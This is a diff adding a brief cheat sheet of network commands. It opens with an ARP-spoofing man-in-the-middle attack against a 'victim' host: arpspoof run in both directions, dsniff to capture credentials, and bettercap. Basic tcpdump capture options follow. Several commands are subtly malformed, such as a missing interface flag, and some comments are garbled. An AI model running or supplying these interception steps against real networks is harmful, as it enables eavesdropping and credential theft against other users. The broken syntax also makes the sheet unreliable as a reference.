@@ -1,0 +1,47 @@
+
+arpspoof - eth0 -t victim.ip ip.impersonate
+
+##newterminal
+arpspoof - eth0 -t ip.impersonate victim.ip
+
+##in live session
+dsniff -i eth0 
+
+##bettercap
+bettercap -I eth0 -X -G victim.ip -T impersonate.ip
+
+##tcpdump pack analyzer
+tcpdump -D 
+
+##tcpdump listening mode
+tcpdump -i eth0 
+
+##tcpdump verbose mode
+tcpdump -i eth0 -v 
+
+##tcpdump no dns resolution
+tcpdump -i eth0 -n 
+
+##tcpdump quite mode
+tcpdump -i eth0 -q
+
+##tcpdump listen for spesific host
+tcpdump -i eth0 host example.com 
+ 
+##tcpdump listen spesific systems
+tcpdump -i eth0 src 192.168.1.201 dst 192.168.1.1
+
+##needs a file with port included
+tcpdump -i eth0 -F file.txt
+
+##pacture to capture
+tcpdump -i eth0 -c 250
+
+##tcpdump save traffic to outfile
+tcpdump -i eth0 -w output_file.txt
+
+##tcpdump read the file 
+tcpdump -i eth0 -r output_file.txt
+
+##tcpdump 
+tcpdump -i eth0 
